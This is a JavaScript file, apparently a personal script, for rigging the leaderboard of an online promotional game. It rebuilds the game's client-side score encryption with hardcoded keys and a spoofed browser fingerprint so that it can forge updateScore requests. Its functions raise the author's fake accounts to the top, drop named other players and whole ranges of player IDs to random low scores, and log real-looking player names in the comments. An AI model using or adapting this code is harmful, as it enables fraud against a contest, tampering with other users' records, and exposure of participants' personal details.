// This function will call the methods we want to run now
// async function foo() {
//     let playerId = await create_user("Meow", "4455445566");
//     console.info("player: " + playerId);
//     dataLayer.push({
//         'event': "game_start"
//     });
//     await new Promise(r => setTimeout(r, 1000));
//     dataLayer.push({
//         'event': 'current_players'
//     });
//     await new Promise(r => setTimeout(r, 1000));
//     dataLayer.push({
//         'event': 'game_ended'
//     });
//     // await set_as_first_place(playerId);
    
//     update_score(6000);
// }

// async function create_user(fullname, phone) {
//     return new Promise((resolve, reject) => {
//         let xhr = new XMLHttpRequest();
//         xhr.open('POST', 'https://tictac-winter.co.il/index.php/createUser', true);
//         let form_data = new FormData();
//         form_data.append("fullname", fullname);
//         form_data.append("telephone", phone);
//         xhr.onload = function() {
//             if (this.status == 200) {
//                 resolve(JSON.parse(this.responseText).playerId);
//             } else {
//                 reject("FAILURE");
//             }
//         }
//         xhr.onerror = function() {
//             reject("FAILURE");
//         }
//         xhr.send(form_data);
//         dataLayer.push({
//             'event': 'signin'
//         });
//     });
// }

function update_score(new_uid, new_score) {
    let form_data = new FormData();
    let USIDCTR = CryptoJSAesJson.encrypt(new_uid, "3hgqH9qSDtJxvlJ54fCqmPsDMw5bjSWze5pQER7tweHyts7ZQjrMqleHWj6i3dxYFUHx");
    let SCRCTR = CryptoJSAesJson.encrypt(new_score, "3hgqH9qSDtJxvlJ54fCqmPsDMw5bjSWze5pQER7tweHyts7ZQjrMqleHWj6i3dxYFUHx");
    let SCRCJR = CryptoJSAesJson.encrypt(new_score, 'XyMwknpvyaQFDoL6aELw8eeFxg7VBkElnaanWPEzQzqfUvQbRc6KLNfeyrd56JZPiKQzUzsyA4uAmHykHTEXyE6SJGCmpmGTToa5fyDmm');
    let _0x42bfc0 = navigator.userAgent + " /// " + window.screen.availHeight + 'x' + window.screen.availWidth + " /// " + screen.height + 'x' + screen.width + " /// " + window.screen.width * window.devicePixelRatio + 'x' + window.screen.height * window.devicePixelRatio;
    let _0x50d299 = CryptoJSAesJson.encrypt(_0x42bfc0, "3hgqH9qSDtJxvlJ54fCqmPsDMw5bjSWze5pQER7tweHyts7ZQjrMqleHWj6i3dxYFUHx");
    form_data.append("playerId", USIDCTR);
    form_data.append("score", SCRCTR);
    form_data.append("token", SCRCJR);
    form_data.append('data', _0x50d299);
    var req = new XMLHttpRequest();
    req.open('POST', 'https://tictac-winter.co.il/index.php/updateScore', true);
    req.onload = function () {
        console.debug(this.responseText);
        let _0x443239 = JSON.parse(this.responseText);
        if (_0x443239.success) {
            console.debug("***** Results: ");
            for (let i = 0; i < 5; i++) {
                console.debug(i.toString() + "place: " + _0x443239.topPlayers[i].fullname);
            }
            console.debug("position: " + _0x443239.myPosition);
            return _0x443239;
        }
    };
    req.send(form_data);
}

async function do_my_trick() {
    for(let i = 0; i < 1; i++) {
        console.debug("============= Current time =============");
        console.debug(new Date().toString());

        // Set my own users
        console.debug("Overwriting " + 19603);
        update_score(19603, 1420);
        await new Promise(r => setTimeout(r, 2000));
        console.debug("Overwriting " + 19604);
        update_score(19604, 1370);
        await new Promise(r => setTimeout(r, 2000 + 250));
        console.debug("Overwriting " + 21246);
        update_score(21246, 1250);
        await new Promise(r => setTimeout(r, 2000 + 500));

        // Remove the annoying users
        [20771, 20853, 20962, 21087, 21234, 21250].forEach(async u => {
            console.debug("Overwriting " + u);
            update_score(u, 50 + (Math.round(Math.random() * 45) * 10));
            // await new Promise(r => setTimeout(r, 1000));
        });

        // Sleep for 30 minutes
        // await new Promise(r => setTimeout(r, 1800000)); // 5 minutes
    }
}

function test_me() {
    alert("meow!!");
    console.debug("NOWWWW!");
    update_score(20771, 10000);
}

// async function set_as_first_place(playerId) {
//     console.info("playerId: " + playerId);
//     return new Promise((resolve, reject) => {
//         let xhr = new XMLHttpRequest();
//         xhr.open('POST', 'https://tictac-winter.co.il/index.php/updateScore', true);
//         let form_data = new FormData();
//         let USIDCTR = CryptoJSAesJson.encrypt(16562, "bALegXaf3WIwcLytpw==");
//         let SCRCTR = CryptoJSAesJson.encrypt(6000, "bALegXaf3WIwcLytpw==");
//         let SCRCJR = CryptoJSAesJson.encrypt(6000, 'BFTdMHGNU2JUj8j5557otWBkycsJQvvDVnjmRGTPoAjoZfdDu8RVgByzD888TNcMZqJh5nquGudi25sjwMXx2jw');
//         let _0x2de02f = navigator.userAgent + " /// " + window.screen.availHeight + 'x' + window.screen.availWidth + " /// " + screen.height + 'x' + screen.width + " /// " + window.screen.width * window.devicePixelRatio + 'x' + window.screen.height * window.devicePixelRatio;
//         let _0x50d299 = CryptoJSAesJson.encrypt(_0x2de02f, "bALegXaf3WIwcLytpw==");
//         form_data.append("playerId", USIDCTR);
//         form_data.append("score", SCRCTR);
//         form_data.append("token", SCRCJR);
//         form_data.append('data', _0x50d299);
//         xhr.onload = function() {
//             console.info("response: " + this.responseText);
//             if (this.status == 200) {
//                 resolve(JSON.parse(this.responseText));
//             } else {
//                 reject("FAILURE");
//             }
//         }
//         xhr.onerror = function() {
//             reject("FAILURE");
//         }
//         xhr.send(form_data);
//     });
// }

async function reset_users_range(start, end) {
    // Now, send the messages
    for (let i = end; i >= start; i--) {
        // Create the form data (playerId, score, token, data)
        console.debug("Overwriting: " + i);
        update_score(i, 50 + (Math.round(Math.random() * 45) * 10));
        await new Promise(r => setTimeout(r, 1000 + Math.floor(Math.random() * 100)));
    }
}

// async function iterate_top_five(uid) {
//     for (let i = 0; i < 600; i++) {

//         // SEND THE REQUEST
//         let new_score = 100 + Math.floor(Math.random() * 250);
//         var form_data = new FormData();
//         let USIDCTR = CryptoJSAesJson.encrypt(uid, "bALegXaf3WIwcLytpw==");
//         let SCRCTR = CryptoJSAesJson.encrypt(new_score, "bALegXaf3WIwcLytpw==");
//         let SCRCJR = CryptoJSAesJson.encrypt(new_score, 'BFTdMHGNU2JUj8j5557otWBkycsJQvvDVnjmRGTPoAjoZfdDu8RVgByzD888TNcMZqJh5nquGudi25sjwMXx2jw');
//         let _0x2de02f = navigator.userAgent + " /// " + window.screen.availHeight + 'x' + window.screen.availWidth + " /// " + screen.height + 'x' + screen.width + " /// " + window.screen.width * window.devicePixelRatio + 'x' + window.screen.height * window.devicePixelRatio;
//         let _0x50d299 = CryptoJSAesJson.encrypt(_0x2de02f, "bALegXaf3WIwcLytpw==");
//         form_data.append("playerId", USIDCTR);
//         form_data.append("score", SCRCTR);
//         form_data.append("token", SCRCJR);
//         form_data.append('data', _0x50d299);
//         var req = new XMLHttpRequest();
//         req.open('POST', 'https://tictac-winter.co.il/index.php/updateScore', true);
//         req.onload = function () {
//             console.debug(this.responseText);
//             let _0x443239 = JSON.parse(this.responseText);
//             if (_0x443239.success) {
//                 console.debug("current time: " + new Date())
//                 console.debug("position: " + _0x443239.myPosition);
//                 console.debug("1st: " + _0x443239.topPlayers[0].fullname);
//                 console.debug("2nd: " + _0x443239.topPlayers[1].fullname);
//                 console.debug("3rd: " + _0x443239.topPlayers[2].fullname);
//                 console.debug("4th: " + _0x443239.topPlayers[3].fullname);
//                 console.debug("5th: " + _0x443239.topPlayers[4].fullname);
//             }
//         };
//         req.send(form_data);

//         // Now WAIT!
//         await new Promise(r => setTimeout(r, 29000 + Math.floor(Math.random() * 5000)));
//     }
// }




// [***] Update: 22/11/24
// Top 5:
// 1. Avi - 9790
// 2. Gil Mansko - 5610
// 3. Ofek Frid - 4710
// 4. Tomer Acrish - 3100
// 5. Gil Mansko - 3020
//
// Put my own users:
// 1. user 19603 - score 3110, name Yuval Farkash
// 2. user 19604 - score 3090, name Yuval Farakash
// 3. user 19605 - score 4720, name: Itay Giladi
// 4. user 19606 - score 5620, name Shaked Chen
// 5. user 19607- score 9800, name Benny Itzhaki
//
// [***] Update 23/11/24, 21:26
// All of the created users still exist, in the same place as before.
// Tomorrow morning we'll see their status, as this was the moment my
// previous users were deleted.
//